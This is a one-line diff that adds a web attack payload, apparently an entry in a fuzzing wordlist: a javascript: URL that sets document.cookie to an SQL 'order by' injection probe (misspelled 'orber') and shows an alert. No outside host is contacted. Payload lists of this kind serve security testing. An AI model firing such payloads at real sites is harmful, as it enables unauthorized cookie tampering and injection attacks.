@@ -1,0 +1,1 @@
+javascript:alert(document.cookie='id='+escape(10786 orber by 10))
